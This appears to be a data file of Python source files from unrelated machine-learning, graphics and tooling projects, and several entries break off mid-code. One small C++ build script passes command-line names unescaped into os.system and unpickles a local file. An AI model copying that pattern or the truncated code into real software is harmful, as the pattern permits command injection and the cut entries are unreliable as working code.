    "# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.\n# SPDX-License-Identifier: Apache-2.0\nimport numpy as np\nimport scipy\nimport scipy.linalg\nfrom scipy.optimize import minimize\nfrom scipy.stats import norm\n\nfrom sklearn import preprocessing\n\n\ndef delta_eps(eps, mu):\n    \"\"\"Delta computation based on mu and epsilon.\n\n     .. math::\n\n        \\begin{aligned}\n            \\delta(\\epsilon) = \\Phi(-\\epsilon / \\mu + \\mu / 2) - \\exp(\\epsilon)\\Phi(-\\epsilon / \\mu - \\mu / 2)\n        \\end{aligned}\n\n\n    Args:\n        mu (float): privacy parameter in Gaussian Differential Privacy\n        eps (float): privacy parameter in Approximate Differential Privacy\n\n    Returns:\n        delta (float): converted delta in Approximate Differential Privacy\n\n    \"\"\"\n    delta = norm.cdf(-eps / mu + mu / 2) - np.exp(eps) * norm.cdf(-eps / mu - mu / 2)\n    return delta\n\ndef convert_ApproxDP_to_GDP(eps: float, delta: float = 1e-6):\n    \"\"\"Convert the privacy parameters eps and delta in Approximate DP to the privacy parameter mu in Gaussian DP\n\n    With the same privacy loss, Gaussian DP allows more interactions with the data than Approximate DP does.\n    The underlying composition over multiple campaigns is done through Gaussian DP.\n\n    Once we receive the total privacy budget in eps provided by a customer, this function converts (eps, delta) pair to mu.\n\n    Args:\n        eps (float): privacy parameter in Approximate Differential Privacy\n        delta (float): privacy parameter in Approximate Differential Privacy\n\n    Returns:\n        mu (float): privacy parameter in Gaussian Differential Privacy\n    \"\"\"\n\n    assert eps > 0\n    assert delta > 0\n\n    res = minimize(\n        fun=lambda mu: (np.log(delta_eps(eps, mu)) - np.log(delta)) ** 2.0,\n        x0=eps,\n        bounds=((delta, None),),\n        tol=delta**2.0,\n        method=\"Nelder-Mead\",\n        options={\"maxiter\": 10000},\n    )\n    mu = res.x\n\n    return mu\n\nclass BoostedAdaSSP:\n    def __init__(\n        self,\n        x_bound=1,\n        y_bound=1,\n        epsilon=1,\n        delta=1e-6,\n        num_iterations=100,\n        shrinkage=\"constant\",\n        random_state=np.random.RandomState(42),\n    ):\n        self.rng = random_state\n        self.x_bound = x_bound\n        self.y_bound = y_bound\n        self.epsilon = epsilon\n        self.delta = delta\n        self.num_iterations = num_iterations\n\n        if shrinkage == \"constant\":\n            self.shrinkage = lambda x: 1\n        if shrinkage == \"1/T\":\n            self.shrinkage = lambda x: 1/x\n        if shrinkage == \"1/T**0.5\":\n            self.shrinkage = lambda x: 1/x ** 0.5\n       \n        self.sigma = convert_ApproxDP_to_GDP(self.epsilon, self.delta)\n\n\n    def clipping_norm(self, X):\n        normalized_X = preprocessing.normalize(X, norm=\"l2\")\n        length_X = np.linalg.norm(X, axis=1, keepdims=True)\n        clipped_X = normalized_X * length_X.clip(min=0, max=self.x_bound)\n\n        return clipped_X\n\n    def noisy_cov(self, XTX):\n        # GM1\n        Z = self.x_bound**2 * self.sigma * self.rng.normal(size=XTX.shape)\n\n        Z_analyzegauss = np.triu(Z) + np.triu(Z, k=1).T\n        hatXTX = XTX + Z_analyzegauss\n        # GM3\n        s = scipy.linalg.eigvalsh(XTX, subset_by_value=(0, np.inf))\n        s = s[::-1]\n\n        lambdamin = s[-1] + self.x_bound**2 * self.sigma * self.rng.normal(size=1)\n        lambdamin_lowerbound = max(0, lambdamin - self.x_bound**2 * self.sigma * 1.96)\n\n        dim = XTX.shape[0]\n        lamb = max(\n            0,\n            np.sqrt(dim) * self.sigma * self.x_bound**2 * 1.96 - lambdamin_lowerbound,\n        )\n\n        return hatXTX + lamb * np.eye(dim)\n\n    def run_AdaSSP(self, hatXTX, XTy):\n        # GM2\n        hatXTy = XTy + self.sigma * self.x_bound * self.y_bound * self.rng.normal(\n            size=XTy.shape\n        )\n        theta_adassp = scipy.linalg.solve(hatXTX, hatXTy, assume_a=\"sym\")\n        return theta_adassp\n\n    def fit(self, X, y):\n        X = self.clipping_norm(X)\n\n        n, dim = X.shape\n\n        XTX = X.T @ X \n\n        hatXTX = self.noisy_cov(XTX)\n\n        ensemble_theta = np.zeros(dim)\n\n        for i in range(self.num_iterations):\n            residual = y - X @ ensemble_theta\n            residual = residual.clip(-self.y_bound, self.y_bound)\n            XTy = X.T @ residual \n\n            theta = self.run_AdaSSP(\n                hatXTX,\n                XTy,\n            )\n\n            shrinkage = self.shrinkage((i+1))\n            ensemble_theta += shrinkage * theta\n\n        self.ensemble_theta = ensemble_theta\n        return self\n\n    def predict(self, X):\n        X = self.clipping_norm(X)\n        return X @ self.ensemble_theta\n",
    "# Copyright (c) Meta Platforms, Inc. and affiliates. All Rights Reserved.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport unittest\n\nimport numpy as np\n\nfrom metaseq.data.data_utils_fast import batch_by_size_fn, batch_by_size_vec\n\n\nclass TestBatchBySize(unittest.TestCase):\n    @classmethod\n    def batch_by_size_baseline(\n        cls,\n        indices,\n        num_tokens_vec,\n        max_tokens,\n        max_sentences,\n        bsz_mult,\n    ):\n        \"\"\"Simple, reliable and slow implementation of batch by size\"\"\"\n        batches = []\n        start = 0\n        while start < len(indices):\n            for end in range(start + 1, len(indices) + 1):\n                max_val = max(num_tokens_vec[pos] for pos in range(start, end))\n                sent_count = end - start\n                num_tokens = max_val * sent_count\n                overflow = num_tokens > max_tokens > 0 or sent_count > max_sentences > 0\n                terminate = overflow or end == len(indices)\n                if overflow:\n                    sent_count -= 1\n                if terminate:\n                    if sent_count > bsz_mult:\n                        sent_count = sent_count - sent_count % bsz_mult\n                    batches.append(indices[start : start + sent_count])\n                    start = start + sent_count\n                    break\n        return batches\n\n    @classmethod\n    def _get_error_message(\n        cls, max_sentences, max_tokens, bsz_mult, num_tokens_vec, validation, results\n    ):\n        return f\"\"\"Reference batch_by_size implementation should produce\n                    same output as the baseline method.\n                Params:\n                max_sentences={max_sentences},\n                max_tokens={max_tokens},\n                bsz_mult={bsz_mult},\n                num_tokens_vec={num_tokens_vec},\n                expected_batches={validation},\n                returned_batches={results}\"\"\"\n\n    def _compare_results(\n        self,\n        indices_len,\n        batch_by_size_impl,\n        max_sentences,\n        max_tokens,\n        bsz_mult,\n        num_tokens_vec,\n    ):\n        indices = np.array(list(range(indices_len)))\n        validation = self.batch_by_size_baseline(\n            indices,\n            num_tokens_vec,\n            max_tokens=max_tokens,\n            max_sentences=max_sentences,\n            bsz_mult=bsz_mult,\n        )\n        results = batch_by_size_impl(\n            indices,\n            num_tokens_vec,\n            max_tokens=max_tokens,\n            max_sentences=max_sentences,\n            bsz_mult=bsz_mult,\n        )\n        error_msg = self._get_error_message(\n            max_sentences, max_tokens, bsz_mult, num_tokens_vec, validation, results\n        )\n        self.assertEqual(len(validation), len(results), error_msg)\n        for first, second in zip(validation, results):\n            self.assertTrue(np.array_equal(first, second), error_msg)\n\n    def _run_compare_with_baseline_sweep(self, batch_by_size_impl):\n        \"\"\"Compare reference batch_by_size implementation with batch_by_size_baseline\n        across a dense grid of hyperparam values\"\"\"\n        MAX_MAX_TOKENS = 10\n        NUM_TOKENS_VECS_COUNT = 5\n        for indices_len in [10, 11]:  # try odd and even len of indices\n            for max_sentences in range(0, indices_len + 2):\n                for max_tokens in range(0, MAX_MAX_TOKENS):\n                    for bsz_mult in range(1, max(MAX_MAX_TOKENS, indices_len) + 2):\n                        for _ in range(NUM_TOKENS_VECS_COUNT):\n                            num_tokens_vec = np.random.randint(\n                                0, max_tokens + 1, size=indices_len\n                            )\n                            self._compare_results(\n                                indices_len,\n                                batch_by_size_impl,\n                                max_sentences,\n                                max_tokens,\n                                bsz_mult,\n                                num_tokens_vec,\n                            )\n\n\nclass TestBatchBySizeVec(TestBatchBySize):\n    def test_compare_with_baseline(self):\n        self._run_compare_with_baseline_sweep(batch_by_size_vec)\n\n\nclass TestBatchBySizeFn(TestBatchBySize):\n    def test_compare_with_baseline(self):\n        def batch_by_size_fn_wrapper(\n            indices,\n            num_tokens_vec,\n            max_tokens,\n            max_sentences,\n            bsz_mult,\n        ):\n            def num_tokens_fn(idx):\n                return num_tokens_vec[idx]\n\n            return batch_by_size_fn(\n                indices, num_tokens_fn, max_tokens, max_sentences, bsz_mult\n            )\n\n        self._run_compare_with_baseline_sweep(batch_by_size_fn_wrapper)\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n",
    "\nfrom math import degrees, radians, acos\nimport bpy\nfrom bpy.types import Context, Event, Panel, UIList, UILayout, PropertyGroup, Operator, Pose, PoseBone\nfrom bpy.utils import register_class, unregister_class\nfrom bpy.props import IntProperty, PointerProperty, CollectionProperty, StringProperty, BoolProperty, FloatProperty, FloatVectorProperty\nfrom mathutils import Matrix, Euler, Vector, Quaternion\n\n\nbl_info = {\n    \"name\": \"Quaternion Procedural Bones\",\n    \"description\": \"A pannel that helps create procedural bones for source engine models.\",\n    \"author\": \"Jakobg1215\",\n    \"version\": (1, 0),\n    \"blender\": (4, 0, 0),\n    \"location\": \"View3D > QProcBones\",\n    \"tracker_url\": \"https://github.com/Jakobg1215/qprocbones/issues\",\n    \"category\": \"Rigging\"\n}\n\n\nclass QuaternionTrigger(PropertyGroup):\n    show_trigger: BoolProperty(default=True)\n    tolerance: FloatProperty(default=90, soft_min=0, soft_max=90, precision=6, step=10)\n    trigger: FloatVectorProperty(precision=6)\n    translation: FloatVectorProperty(precision=6)\n    rotation: FloatVectorProperty(precision=6)\n\n\nclass QuaternionProceduralBone(PropertyGroup):\n    target_bone: StringProperty()\n    control_bone: StringProperty()\n    reveal_triggers: BoolProperty()\n    triggers: CollectionProperty(type=QuaternionTrigger)\n    selected_trigger: IntProperty()\n\n\nclass ProceduralBoneData(PropertyGroup):\n    quaternion_procedurals: CollectionProperty(type=QuaternionProceduralBone)\n    selected_quaternion_procedural: IntProperty()\n\n\nclass QuaternionTriggerList(UIList):\n    bl_idname = \"VIEW_3D_UL_QuaternionTriggerList\"\n\n    def draw_item(self, context: Context, layout: UILayout, data: QuaternionProceduralBone, item: QuaternionTrigger,\n                  icon: int, active_data: QuaternionProceduralBone) -> None:\n        col: UILayout = layout.column(align=True)\n\n        row: UILayout = col.row(align=True)\n        row.prop(item, \"show_trigger\", icon=\"TRIA_DOWN\" if item.show_trigger else \"TRIA_RIGHT\", emboss=False,\n                 icon_only=True)\n        row.label(text=\"Trigger\")\n\n        if item.show_trigger:\n            box: UILayout = col.box()\n            col: UILayout = box.column(align=True)\n\n            row: UILayout = col.row(align=True)\n            row.prop(item, \"tolerance\", text=\"Tolerance\")\n\n            row: UILayout = col.row(align=True)\n            row.prop(item, \"trigger\", text=\"Trigger\")\n            row.operator(\"qprocbones.set_trigger_to_current\", text=\"Set\")\n\n            row: UILayout = col.row(align=True)\n            row.prop(item, \"rotation\", text=\"Rotation\")\n            row.operator(\"qprocbones.set_rotation_to_current\", text=\"Set\")\n\n            row: UILayout = col.row(align=True)\n            row.prop(item, \"translation\", text=\"Translation\")\n            row.operator(\"qprocbones.set_translation_to_current\", text=\"Set\")\n\n            col.operator(\"qprocbones.preview_current_trigger\", text=\"Preview\")\n\n\nclass QuaternionProceduralBonesList(UIList):\n    bl_idname = \"VIEW_3D_UL_QuaternionProceduralBonesList\"\n\n    def draw_item(self, context: Context, layout: UILayout, data: ProceduralBoneData, item: QuaternionProceduralBone,\n                  icon: int, active_data: ProceduralBoneData) -> None:\n        col: UILayout = layout.column(align=True)\n\n        skeleton_pose: Pose = context.scene.procedural_skeleton_target.pose\n        row: UILayout = col.row(align=True)\n        row.prop_search(item, \"target_bone\", skeleton_pose, \"bones\", text=\"Target\")\n        row.prop_search(item, \"control_bone\", skeleton_pose, \"bones\", text=\"Control\")\n\n        row: UILayout = col.row(align=True)\n        row.prop(item, \"reveal_triggers\", text=\"Triggers\",\n                 icon=\"TRIA_DOWN\" if item.reveal_triggers else \"TRIA_RIGHT\", emboss=False)\n\n        if item.reveal_triggers:\n            row: UILayout = col.row(align=True)\n            row.template_list(\"VIEW_3D_UL_QuaternionTriggerList\", \"\", item, \"triggers\", item, \"selected_trigger\")\n\n            row: UILayout = row.column(align=True)\n            row.operator(\"qprocbones.add_quaternion_trigger\", icon='ADD', text=\"\")\n            row.operator(\"qprocbones.remove_quaternion_trigger\", icon='REMOVE', text=\"\")\n\n            row: UILayout = row.column(align=True)\n            row.operator(\"qprocbones.move_quaternion_trigger_up\", icon='TRIA_UP', text=\"\")\n            row.operator(\"qprocbones.move_quaternion_trigger_down\", icon='TRIA_DOWN', text=\"\")\n\n        row: UILayout = col.row(align=True)\n        row.operator(\"qprocbones.preview_quaternion_procedural\", text=\"Preview\")\n        row.operator(\"qprocbones.copy_quaternion_procedural\", text=\"Copy\")\n\n\nclass QuaternionProceduralBonesPanel(Panel):\n    bl_category = \"qprocbones\"\n    bl_description = \"\"\n    bl_idname = \"VIEW_3D_PT_QuaternionProceduralBones\"\n    bl_label = \"Quaternion Procedural Bones\"\n    bl_region_type = \"UI\"\n    bl_space_type = \"VIEW_3D\"\n\n    def draw(self, context: Context) -> None:\n        col: UILayout = self.layout.column(align=True)\n        col.prop(context.scene, \"proc",
    "import os\nimport re\nimport json\nimport random\nfrom tqdm import tqdm\n\nimport numpy as np\nfrom rouge import Rouge \n\nimport torch\nfrom torchvision.ops import box_iou\n\n\ndef eval_web_caption(preds, golds, **kwargs):\n    assert len(preds) == len(golds)\n    for i in range(len(preds)):\n        if not preds[i]:\n            preds[i] = \" \"\n\n    rouge = Rouge(metrics=['rouge-1', 'rouge-2', 'rouge-l'])\n    scores = rouge.get_scores(preds, golds, avg=True)\n    return dict(\n        rouge_1=scores['rouge-1']['f'] * 100,\n        rouge_2=scores['rouge-2']['f'] * 100,\n        rouge_l=scores['rouge-l']['f'] * 100\n    )\n\n\ndef eval_head_ocr(preds, golds, **kwargs):\n    assert len(preds) == len(golds)\n    for i in range(len(preds)):\n        if not preds[i]:\n            preds[i] = \" \"\n\n    rouge = Rouge(metrics=['rouge-1', 'rouge-2', 'rouge-l'])\n    scores = rouge.get_scores(preds, golds, avg=True)\n    return dict(\n        rouge_1=scores['rouge-1']['f'] * 100,\n        rouge_2=scores['rouge-2']['f'] * 100,\n        rouge_l=scores['rouge-l']['f'] * 100\n    )\n\n\ndef eval_element_ocr(preds, golds, **kwargs):\n    assert len(preds) == len(golds)\n    for i in range(len(preds)):\n        if not preds[i] or len(preds[i]) == 1:\n            preds[i] = \" \"\n\n    rouge = Rouge(metrics=['rouge-1', 'rouge-2', 'rouge-l'])\n    scores = rouge.get_scores(preds, golds, avg=True)\n    return dict(\n        rouge_1=scores['rouge-1']['f'] * 100,\n        rouge_2=scores['rouge-2']['f'] * 100,\n        rouge_l=scores['rouge-l']['f'] * 100\n    )\n\n\ndef eval_action_prediction(preds, golds, **kwargs):\n    results = []\n    for pred, gold in zip(preds, golds):\n        cur_pred = parse_multi_choice_response(pred, [chr(ord('A')+i) for i in range(8)])\n        try:\n            if ord('A') <= ord(cur_pred) <= ord('Z'):\n                cur_pred = ord(cur_pred) - ord('A')\n            else:\n                cur_pred = -1\n        except:\n            cur_pred = -1\n        results.append(cur_pred == gold)\n\n    return dict(\n        accuracy=sum(results) / len(results) * 100\n    )\n\n\ndef eval_element_ground(preds, golds, **kwargs):\n    results = []\n    for pred, gold in zip(preds, golds):\n        cur_pred = parse_multi_choice_response(pred, [chr(ord('A')+i) for i in range(8)])\n        try:\n            if ord('A') <= ord(cur_pred) <= ord('Z'):\n                cur_pred = ord(cur_pred) - ord('A')\n            else:\n                cur_pred = -1\n        except:\n            cur_pred = -1\n        results.append(cur_pred == gold)\n\n    return dict(\n        accuracy=sum(results) / len(results) * 100\n    )\n\n\ndef eval_action_ground(preds, golds, **kwargs):\n    results = []\n    for pred, gold in zip(preds, golds):\n        cur_pred = parse_multi_choice_response(pred, [chr(ord('A')+i) for i in range(8)])\n        try:\n            if ord('A') <= ord(cur_pred) <= ord('Z'):\n                cur_pred = ord(cur_pred) - ord('A')\n            else:\n                cur_pred = -1\n        except:\n            cur_pred = -1\n        results.append(cur_pred == gold)\n\n    return dict(\n        accuracy=sum(results) / len(results) * 100\n    )\n\n\ndef eval_element_bbox_ground(preds, golds, **kwargs):\n    # print('preds[0]', preds[0])\n    # print('golds[0]', golds[0])\n    correct = total_cnt = 0\n    for i, predict_bbox in enumerate(preds):\n        if not predict_bbox:\n            predict_bbox = (0., 0., 0., 0.)\n        try:\n            target_bbox = torch.tensor(golds[i], dtype=torch.float32).view(-1, 4)\n            predict_bbox = torch.tensor(predict_bbox, dtype=torch.float32).view(-1, 4)\n            iou = box_iou(predict_bbox, target_bbox)\n            iou = iou.item()\n            if iou >= 0.5:\n                correct += 1\n        except:\n            pass\n\n        total_cnt += 1\n\n    return dict(\n        precision=correct / total_cnt * 100\n    )\n\n\ndef eval_action_bbox_ground(preds, golds, **kwargs):\n    correct = total_cnt = 0\n    for i, predict_bbox in enumerate(preds):\n        if not predict_bbox:\n            predict_bbox = (0., 0., 0., 0.)\n        try:\n            target_bbox = torch.tensor(golds[i], dtype=torch.float32).view(-1, 4)\n            predict_bbox = torch.tensor(predict_bbox, dtype=torch.float32).view(-1, 4)\n            iou = box_iou(predict_bbox, target_bbox)\n            iou = iou.item()\n            if iou >= 0.5:\n                correct += 1\n        except:\n            pass\n\n        total_cnt += 1\n\n    return dict(\n        precision=correct / total_cnt * 100\n    )\n\n\ndef eval_webqa(preds, golds, **kwargs):\n    f1_scores = []\n    rouge = Rouge(metrics=['rouge-1'])\n    for pred, gold_list in zip(preds, golds):\n        try:\n            if not pred:\n                pred = \" \"\n            cur_f1 = max([rouge.get_scores([pred], [gold], avg=True)['rouge-1']['f'] for gold in gold_list])\n            f1_scores.append(cur_f1)\n        except:\n            pass\n\n    return dict(\n        f1=sum(f1_scores) / len(f1_scores) * 100\n    )\n\ndef eval_element_point_ground(preds, golds):\n    acc_lst = []\n    for pred, gold in zip",
    "import torchvision\r\nfrom torch.utils.data import DataLoader\r\nimport torch\r\nimport torchvision.transforms as transforms\r\nfrom network import JCM\r\nfrom train import train\r\nfrom evaluation import EVAL\r\nfrom utils import init_seeds\r\nimport os\r\nimport argparse\r\n\r\n\r\ndef mischandler(config):\r\n    if not os.path.exists(config.model_path):\r\n        os.makedirs(config.model_path)\r\n    if not os.path.exists(config.result_path):\r\n        os.makedirs(config.result_path)\r\n\r\n\r\ndef main(config):\r\n    # initialize random seed\r\n    init_seeds()\r\n\r\n    # prepare training & test data\r\n    transform_train = transforms.Compose([\r\n        transforms.RandomHorizontalFlip(),\r\n        transforms.ToTensor(),\r\n        transforms.Normalize(mean=(0.5, 0.5, 0.5), std=(0.5, 0.5, 0.5))\r\n    ])\r\n\r\n    transform_test = transforms.Compose([\r\n        transforms.ToTensor(),\r\n        transforms.Normalize(mean=(0.5, 0.5, 0.5), std=(0.5, 0.5, 0.5))\r\n    ])\r\n\r\n    train_data = torchvision.datasets.CIFAR10(\r\n        root=config.dataset_path,\r\n        train=True,\r\n        transform=transform_train,\r\n        download=True\r\n    )\r\n    test_data = torchvision.datasets.CIFAR10(\r\n        root=config.dataset_path,\r\n        train=False,\r\n        transform=transform_test,\r\n        download=True\r\n    )\r\n\r\n    train_loader = DataLoader(dataset=train_data, batch_size=config.batch_size, shuffle=True)\r\n    test_loader = DataLoader(dataset=test_data, batch_size=config.batch_size, shuffle=True)\r\n\r\n    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\r\n    net = JCM(config, device).to(device)\r\n\r\n    if config.load_checkpoint:\r\n        model_name = '/{}/'.format(config.mod_method) + \\\r\n                     'CIFAR_SNR{:.3f}_Trans{:d}_{}.pth.tar'.format(\r\n                         config.snr_train, config.channel_use, config.mod_method)\r\n        net.load_state_dict(torch.load('./checkpoints' + model_name, map_location=torch.device('cpu')))\r\n\r\n    if config.mode == 'train':\r\n        print(\"Training with the modulation scheme {}.\".format(config.mod_method))\r\n        train(config, net, train_loader, test_loader, device)\r\n\r\n    elif config.mode == 'test':\r\n        print(\"Start Testing.\")\r\n        acc, mse, psnr, ssim = EVAL(net, test_loader, device, config)\r\n        print('acc: {:.3f}, mse: {:3f}, psnr: {:.3f}, ssmi: {:.3f}'.format(acc, mse, psnr, ssim))\r\n\r\n    else:\r\n        print(\"Wrong mode input!\")\r\n\r\n\r\nif __name__ == '__main__':\r\n    parser = argparse.ArgumentParser()\r\n\r\n    # model hyper-parameters\r\n    parser.add_argument('--channel_use', type=int, default=128)\r\n    \"\"\"Available modulation methods:\"\"\"\r\n    \"\"\"bpsk, 4qam, 16qam, 64qam\"\"\"\r\n    parser.add_argument('--mod_method', type=str, default='64qam')\r\n    parser.add_argument('--load_checkpoint', type=int, default=1)\r\n\r\n    # training hyper-parameters\r\n    parser.add_argument('--train_iters', type=int, default=1)\r\n    parser.add_argument('--batch_size', type=int, default=32)\r\n    parser.add_argument('--lr', type=float, default=1e-4)\r\n    parser.add_argument('--snr_train', type=float, default=18)\r\n    parser.add_argument('--snr_test', type=float, default=18)\r\n    \"\"\"The tradeoff hyperparameter lambda between two tasks\"\"\"\r\n    parser.add_argument('--tradeoff_lambda', type=float, default=200)\r\n\r\n    # misc\r\n    parser.add_argument('--dataset', type=str, default='cifar')\r\n    parser.add_argument('--mode', type=str, default='train')\r\n    parser.add_argument('--model_path', type=str, default='./models')\r\n    parser.add_argument('--result_path', type=str, default='./results')\r\n    parser.add_argument('--dataset_path', type=str, default='./dataset')\r\n\r\n    config = parser.parse_args()\r\n\r\n    mischandler(config)\r\n    main(config)\r\n",
    "_base_ = [\n    '../../_base_/datasets/dotav1.py', '../../_base_/schedules/schedule_1x.py',\n    '../../_base_/default_runtime.py'\n]\nangle_version = 'le90'\n# runner\nrunner = dict(type=\"EpochBasedKDRunner\", max_epochs=12)\n# teacher cfg\ndistiller_cfg = dict(\n    teacher_cfg=\"configs/distillation/rotated_retinanet_obb_r50_fpn_1x_dota_le90.py\",\n    teacher_pretrained=\"teacher_checkpoints/rotated_retinanet_obb_r50.pth\",\n)\nprunning_ratio = 0.8\n\nmodel = dict(\n    type='FeatKDRotatedRetinaNet',\n    # distillation setting\n    distillation=dict(\n        loss_balance = 0.25,\n        # Align feat dim\n        # in_channels = 256,  # teacher FPN feat_dim\n        # feat_channels = 256,  # student FPN feat_dim\n        # conv_cfg = dict(type=\"Conv2d\"),\n        # norm_cfg = dict(type=\"BN\"),\n        # act_cfg = dict(type=\"ReLU\"),        \n    ),\n    backbone=dict(\n        type='ResNet',\n        depth=50,\n        num_stages=4,\n        out_indices=(0, 1, 2, 3),\n        base_channels = int(64 * prunning_ratio),\n        frozen_stages=1,\n        zero_init_residual=False,\n        norm_cfg=dict(type='BN', requires_grad=True),\n        norm_eval=True,\n        style='pytorch',\n        init_cfg=dict(type='Pretrained', checkpoint='prune_ckpt/resnet50_trimmed.pth')),\n    neck=dict(\n        type='FPN',\n        in_channels=[int(64*prunning_ratio)*1*4, int(64*prunning_ratio)*2*4, int(64*prunning_ratio)*4*4, int(64*prunning_ratio)*8*4],\n        out_channels=256,\n        start_level=1,\n        add_extra_convs='on_input',\n        num_outs=5),\n    bbox_head=dict(\n        type='RotatedRetinaHead',\n        num_classes=15,\n        in_channels=256,\n        stacked_convs=4,\n        feat_channels=256,\n        assign_by_circumhbbox=None,\n        anchor_generator=dict(\n            type='RotatedAnchorGenerator',\n            octave_base_scale=4,\n            scales_per_octave=3,\n            ratios=[1.0, 0.5, 2.0],\n            strides=[8, 16, 32, 64, 128]),\n        bbox_coder=dict(\n            type='DeltaXYWHAOBBoxCoder',\n            angle_range=angle_version,\n            norm_factor=None,\n            edge_swap=True,\n            proj_xy=True,\n            target_means=(.0, .0, .0, .0, .0),\n            target_stds=(1.0, 1.0, 1.0, 1.0, 1.0)),\n        loss_cls=dict(\n            type='FocalLoss',\n            use_sigmoid=True,\n            gamma=2.0,\n            alpha=0.25,\n            loss_weight=1.0),\n        loss_bbox=dict(type='L1Loss', loss_weight=1.0)),\n    train_cfg=dict(\n        assigner=dict(\n            type='MaxIoUAssigner',\n            pos_iou_thr=0.5,\n            neg_iou_thr=0.4,\n            min_pos_iou=0,\n            ignore_iof_thr=-1,\n            iou_calculator=dict(type='RBboxOverlaps2D')),\n        allowed_border=-1,\n        pos_weight=-1,\n        debug=False),\n    test_cfg=dict(\n        nms_pre=2000,\n        min_bbox_size=0,\n        score_thr=0.05,\n        nms=dict(iou_thr=0.1),\n        max_per_img=2000))\n\nimg_norm_cfg = dict(\n    mean=[123.675, 116.28, 103.53], std=[58.395, 57.12, 57.375], to_rgb=True)\ntrain_pipeline = [\n    dict(type='LoadImageFromFile'),\n    dict(type='LoadAnnotations', with_bbox=True),\n    dict(type='RResize', img_scale=(1024, 1024)),\n    dict(\n        type='RRandomFlip',\n        flip_ratio=[0.25, 0.25, 0.25],\n        direction=['horizontal', 'vertical', 'diagonal'],\n        version=angle_version),\n    dict(type='Normalize', **img_norm_cfg),\n    dict(type='Pad', size_divisor=32),\n    dict(type='DefaultFormatBundle'),\n    dict(type='Collect', keys=['img', 'gt_bboxes', 'gt_labels'])\n]\n\noptimizer = dict(type='SGD', lr=0.0025, momentum=0.9, weight_decay=0.0001)\n# lr=(samples_per_gpu * num_gpu) / 16 * 0.01\n\ndata = dict(\n    samples_per_gpu=2,\n    workers_per_gpu=2,\n    train=dict(pipeline=train_pipeline, version=angle_version),\n    val=dict(version=angle_version),\n    test=dict(version=angle_version))\n",
    "import pickle, os, sys\n\n########## CONFIG ##########\nsrc_dir : str = \"src/\"\nlib_dir : str = \"lib/\"\nbin_dir : str = \"bin/\"\nintermediate_dir : str = \"intermediate/\"\n\nmain_file : str = \"main.cpp\"\nexecutable_file : str = \"main\"\n\ntracking_file : str = \"tracking_builds.bin\"\n############################\n\narguments : list[str] = sys.argv\n\nclass File:\n    def __init__(self, name : str = \"\", extension : str = \"cpp\"):\n        self.last_time_edit : int = 0\n        self.name : str = name\n        self.extension : str = extension\n    def check_compile(self, libs) -> bool:\n        current_time_edit : int = os.path.getmtime(src_dir + self.name + \".\" + self.extension)\n        if self.last_time_edit != current_time_edit or not os.path.exists(intermediate_dir+self.name+\".o\"):\n            self.last_time_edit = current_time_edit\n            os.system(f\"g++ {src_dir + self.name}.{self.extension} -o {intermediate_dir + self.name}.o -c {libs} -I{lib_dir}\")\n            return True\n        return False\n    def exists(self) -> bool:\n        if os.path.exists(src_dir + self.name + \".\" + self.extension):\n            return True\n        return False\n\nlibs : str = \"\"\nfiles : list[File] = []\n\ndef load_tracking_file() -> None:\n    global libs, files\n    file = open(tracking_file, \"rb\")\n    libs, files = pickle.load(file)\n    file.close()\n\ndef save_tracking_file() -> None:\n    file = open(tracking_file, \"wb\")\n    obj = [libs, files]\n    pickle.dump(obj, file)\n    file.close()\n\ndef link() -> None:\n    files_string : str = \"\"\n    for file in files:\n        files_string += intermediate_dir + file.name + \".o \"\n    os.system(f\"g++ {files_string}-o {bin_dir}{executable_file} {libs} -I{lib_dir}\")\n\ndef append_lib(lib : str) -> None:\n    global libs\n    if not (f\"-l{lib}\" in libs.split(\" \")):\n        libs += f\"-l{lib} \"\n        return\n    print(f\"failed to append the library {lib}, already keeping track of it\")\n\ndef remove_lib(lib : str) -> None:\n    global libs\n    if not f\"-l{lib} \" in libs:\n        print(f\"not keeping track of any lib called '{lib}'.\")\n        return\n    libs = libs.replace(f\"-l{lib} \", \"\")\n\ndef clear_unexistant_files() -> None:\n    for i, file in enumerate(files):\n        if not file.exists():\n            del files[i]\n\ndef append_file(file : str) -> None:\n    global files\n    name, extension = file.split(\".\")\n    for c_file in files:\n        if name == c_file.name and extension == c_file.extension:\n            print(f\"failed to append the file {file}, already keeping track of it.\")\n            return\n    files.append(File(name, extension))\n\ndef remove_file(file : str) -> None:\n    name, extension = file.split(\".\")\n    for i, c_file in enumerate(files):\n        if c_file.name == name and c_file.extension == extension:\n            del files[i]\n            return\n    print(f\"not keeping track of any file called {file}.\")\n\nif not os.path.exists(tracking_file):\n    temp_file = open(tracking_file, \"x\")\n    temp_file.close()\n\nwith open(tracking_file, \"rb\") as f:\n    if f.readlines() != []:\n        load_tracking_file()\n\nclear_unexistant_files()\n\nif files == []:\n    append_file(main_file)\n\nmatch arguments[1]:\n    case \"run\":\n        anything_compiled = False\n        for file in files:\n            if file.check_compile(libs):\n                anything_compiled = True\n        if anything_compiled or (not(os.path.exists(bin_dir+executable_file))):\n            link()\n        os.system(bin_dir + executable_file)\n    case \"append\":\n        append_file(arguments[2])\n    case \"remove\":\n        remove_file(arguments[2])\n    case \"lib\":\n        if arguments[2] != \"-r\":\n            append_lib(arguments[2])\n        else :\n            remove_lib(arguments[3])\n    case \"comp\":\n        for file in files:\n            file.check_compile(libs)\n        link()\n\nsave_tracking_file()\n",
    "# -*- coding: utf-8 -*-\n# Generated by the protocol buffer compiler.  DO NOT EDIT!\n# source: mediapipe/calculators/image/opencv_encoded_image_to_image_frame_calculator.proto\n\"\"\"Generated protocol buffer code.\"\"\"\nfrom google.protobuf import descriptor as _descriptor\nfrom google.protobuf import descriptor_pool as _descriptor_pool\nfrom google.protobuf import symbol_database as _symbol_database\nfrom google.protobuf.internal import builder as _builder\n# @@protoc_insertion_point(imports)\n\n_sym_db = _symbol_database.Default()\n\n\nfrom mediapipe.framework import calculator_pb2 as mediapipe_dot_framework_dot_calculator__pb2\ntry:\n  mediapipe_dot_framework_dot_calculator__options__pb2 = mediapipe_dot_framework_dot_calculator__pb2.mediapipe_dot_framework_dot_calculator__options__pb2\nexcept AttributeError:\n  mediapipe_dot_framework_dot_calculator__options__pb2 = mediapipe_dot_framework_dot_calculator__pb2.mediapipe.framework.calculator_options_pb2\n\n\nDESCRIPTOR = 